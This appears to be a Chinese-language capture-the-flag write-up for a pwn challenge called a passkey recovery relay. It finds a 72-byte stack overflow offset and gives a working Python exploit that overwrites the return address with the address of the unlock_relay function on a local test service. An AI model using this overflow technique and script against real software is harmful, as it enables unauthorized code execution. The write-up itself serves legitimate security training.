# Pwn 题解：Passkey 恢复中继

## 解法

先看保护和目标函数：

```bash
checksec --file=relay.bin
objdump -d relay.bin | rg '<unlock_relay>'
```

这题没有 PIE 和栈保护，缓冲区大小是 `64` 字节，再加上 `saved rbp` 的 `8` 字节，偏移就是 `72`。

先从附件里取出真实目标地址：

```bash
nm -an relay.bin | awk '/ unlock_relay$/ {print "0x"$1}'
```

以本地验证为例，构造 payload：

```bash
python3 - <<'PY' "$(nm -an relay.bin | awk '/ unlock_relay$/ {print "0x"$1}')"
import socket
import struct
import sys

HOST = "127.0.0.1"
PORT = 18085
UNLOCK_RELAY = int(sys.argv[1], 16)

payload = b"A" * 72 + struct.pack("<Q", UNLOCK_RELAY)

with socket.create_connection((HOST, PORT), timeout=3) as sock:
    banner = b""
    while b"paste recovery phrase:" not in banner:
        chunk = sock.recv(4096)
        if not chunk:
            break
        banner += chunk
    print(banner.decode(errors="replace"), end="")
    sock.sendall(payload)
    sock.shutdown(socket.SHUT_WR)
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        print(chunk.decode(errors="replace"), end="")
PY
```

服务会打印动态 Flag，提交即可。
